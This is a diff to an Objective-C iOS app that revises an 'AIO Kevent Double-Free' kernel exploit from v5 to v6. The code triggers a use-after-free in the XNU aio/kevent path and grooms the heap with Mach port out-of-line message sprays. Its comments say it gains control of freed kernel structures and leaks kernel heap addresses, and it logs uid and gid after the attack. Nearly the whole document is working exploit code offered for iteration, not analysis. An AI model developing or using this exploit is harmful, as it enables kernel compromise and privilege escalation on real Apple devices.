@@ -5658,16 +5658,18 @@ static void *aio_free_and_reclaim_racer(void *arg) {
 // Confirms ext[1] control via reclaim aio_nbytes (distinct marker).
 // Leaks kernel heap address via kevent64 ident field.
 
-static volatile int32_t _aioUafRunning = 0;
-#import <libkern/OSAtomic.h>
+static int _aioUafRunning = 0;
 
 - (void)aioUafTapped {
-    if (!OSAtomicCompareAndSwap32Barrier(0, 1, &_aioUafRunning)) {
-        [self appendLog:@"⚠ Already running — ignoring tap"];
-        return;
+    @synchronized(self) {
+        if (_aioUafRunning) {
+            [self appendLog:@"⚠ Already running — ignoring tap"];
+            return;
+        }
+        _aioUafRunning = 1;
     }
 
-    [self appendLog:[NSString stringWithFormat:@"\n========== AIO Kevent Double-Free v5 [tid=%llu] ==========", (uint64_t)pthread_mach_thread_np(pthread_self())]];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v6 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5684,7 +5686,7 @@ static volatile int32_t _aioUafRunning = 0;
     int fd = open(path.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create temp file"];
-        OSAtomicCompareAndSwap32Barrier(1, 0, &_aioUafRunning);
+        _aioUafRunning = 0;
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
             [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
@@ -5852,18 +5854,21 @@ static volatile int32_t _aioUafRunning = 0;
 
     [self appendLog:@"\n--- Phase D: Magazine drain + OOL overlap ---"];
 
-    // Create spray ports with queue limit=10 so 5 drain + 1 overlap = 6 msgs fit
-    enum { kDrainPorts = 5, kDrainMsgsPerPort = 5, kDrainTotal = kDrainPorts * kDrainMsgsPerPort };
-    mach_port_t drainPorts[kDrainPorts];
+    // Create 8 drain ports + 1 dedicated overlap port. 3 msgs each = fits in qlimit=5.
+    enum { kDrainPorts = 8, kDrainMsgsPerPort = 3, kDrainTotal = kDrainPorts * kDrainMsgsPerPort };
+    mach_port_t drainPorts[kDrainPorts + 1];  // +1 for dedicated overlap port
+    mach_port_t overlapPort = MACH_PORT_NULL;
     int drainPortsReady = 0;
     for (int p = 0; p < kDrainPorts; p++) {
         drainPorts[p] = MACH_PORT_NULL;
         if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainPorts[p]) == KERN_SUCCESS) {
             mach_port_insert_right(mach_task_self_, drainPorts[p], drainPorts[p], MACH_MSG_TYPE_MAKE_SEND);
-            // Increase queue limit from default 5 to 10
-            mach_port_set_qlimit(mach_task_self_, drainPorts[p], MACH_PORT_QLIMIT_DEFAULT, 10);
             drainPortsReady++;
         }
+    }
+    // Dedicated port for overlap spray — only gets 1 drain msg → 1+1=2 < 5
+    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapPort) == KERN_SUCCESS) {
+        mach_port_insert_right(mach_task_self_, overlapPort, overlapPort, MACH_MSG_TYPE_MAKE_SEND);
     }
     [self appendLog:[NSString stringWithFormat:@"  Drain ports: %d/%d ready", drainPortsReady, kDrainPorts]];
 
@@ -5925,14 +5930,32 @@ static volatile int32_t _aioUafRunning = 0;
         int e1ok = (aio_read(&e1) == 0);
         [self appendLog:[NSString stringWithFormat:@"  E1 aio_read: %@", e1ok ? @"OK" : @"FAIL"]];
 
-        if (e1ok && drainPayload && drainPortsReady > 0) {
-            // Queue limit raised to 10 → 5 drain + 1 overlap = 6 msgs fit without draining
-            [self appendLog:@"  D: sending overlap OOL (qlimit=10, no pre-drain needed)..."];
+        if (e1ok && drainPayload && drainPortsReady > 0 && overlapPort != MACH_PORT_NULL) {
+            // Dedicated overlap port: only 1 drain msg sent → queue has room for overlap
+            [self appendLog:@"  D: sending drain msg to overlap port..."];
+            {
+                DrainMsg preMsg;
+                memset(&preMsg, 0, sizeof(preMsg));
+                preMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+                preMsg.header.msgh_size = sizeof(DrainMsg);
+                preMsg.header.msgh_remote_port = overlapPort;
+                preMsg.header.msgh_id = 8888;
+                preMsg.body.msgh_descriptor_count = 1;
+                preMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+                preMsg.ool.address = drainPayload;
+                preMsg.ool.size = kDrainOolSize;
+                preMsg.ool.deallocate = FALSE;
+                preMsg.ool.copy = MACH_MSG_PHYSICAL_COPY;
+                kern_return_t pkr = mach_msg(&preMsg.header, MACH_SEND_MSG, sizeof(preMsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                [self appendLog:[NSString stringWithFormat:@"  D: pre-drain send kr=%d", pkr]];
+            }
+
+            [self appendLog:@"  D: sending overlap OOL (dedicated port, 1+1=2 < qlimit=5)..."];
             DrainMsg overlapMsg;
             memset(&overlapMsg, 0, sizeof(overlapMsg));
             overlapMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
             overlapMsg.header.msgh_size = sizeof(DrainMsg);
-            overlapMsg.header.msgh_remote_port = drainPorts[0];
+            overlapMsg.header.msgh_remote_port = overlapPort;
             overlapMsg.header.msgh_id = 9999;
             overlapMsg.body.msgh_descriptor_count = 1;
             overlapMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
@@ -5971,11 +5994,16 @@ static volatile int32_t _aioUafRunning = 0;
         }
     }
 
-    // Drain all remaining messages from ports
+    // Drain all remaining messages from ports (best-effort, ignore errors)
     for (int p = 0; p < drainPortsReady; p++) {
         DrainMsg drmsg;
         while (mach_msg(&drmsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(DrainMsg), drainPorts[p], 1, MACH_PORT_NULL) == MACH_MSG_SUCCESS) ;
         mach_port_destroy(mach_task_self_, drainPorts[p]);
+    }
+    if (overlapPort != MACH_PORT_NULL) {
+        DrainMsg drmsg;
+        while (mach_msg(&drmsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(DrainMsg), overlapPort, 1, MACH_PORT_NULL) == MACH_MSG_SUCCESS) ;
+        mach_port_destroy(mach_task_self_, overlapPort);
     }
     free(drainPayload);
 
@@ -5983,7 +6011,7 @@ static volatile int32_t _aioUafRunning = 0;
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
     [self appendLog:@"========== AIO Kevent Double-Free Complete =========="];
-            OSAtomicCompareAndSwap32Barrier(1, 0, &_aioUafRunning);
+            _aioUafRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
                 [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
